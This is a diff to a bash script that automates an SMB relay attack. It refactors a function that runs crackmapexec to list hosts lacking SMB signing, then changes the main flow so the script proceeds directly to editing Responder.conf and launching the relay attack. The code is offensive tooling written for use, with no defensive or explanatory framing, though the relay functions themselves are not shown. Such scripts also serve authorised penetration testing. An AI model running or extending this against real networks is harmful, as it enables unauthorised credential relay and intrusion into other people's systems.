@@ -100,24 +100,23 @@ validate_network_interface() {
 # Run crackmapexec
 run_crackmapexec() {
     log INFO "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}"
-    log SUCCESS "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
-    
-    # Run crackmapexec and let it generate the relay list
+
     crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
-        log ERROR "${RED}[!] crackmapexec failed. Exiting.${RESET}"
+        log ERROR "${RED}[!] crackmapexec failed.${RESET}"
         return 1
     }
-    
-    if [ -s "${TARGET_SMB_FILE}" ]; then
-        count=$(wc -l < "${TARGET_SMB_FILE}")
-        log INFO "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
+
+    if [ ! -s "${TARGET_SMB_FILE}" ]; then
+        log ERROR "${RED}[!] No vulnerable targets found.${RESET}"
+        return 1
+    fi
+
+    count=$(wc -l < "${TARGET_SMB_FILE}")
+    log INFO "${YELLOW}[+] Found $count vulnerable target(s).${RESET}"
+
     while read -r ip; do
         echo -e "${YELLOW}[!] $ip${RESET}"
     done < "${TARGET_SMB_FILE}"
-    else
-        log ERROR "${RED}[!] No vulnerable targets found.${RESET}"
-    fi
-
 }
 
 # Edit Responder.conf file
@@ -274,12 +273,7 @@ if ! run_crackmapexec; then
     exit 1
 fi
 
-if [ -s "${TARGET_SMB_FILE}" ]; then
-    log SUCCESS "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
-    edit_responder_conf
-    sleep 3
-    run_smb_relay_attack
-else
-    log ERROR "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
-    exit 0
-fi
+log SUCCESS "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
+edit_responder_conf
+sleep 3
+run_smb_relay_attack
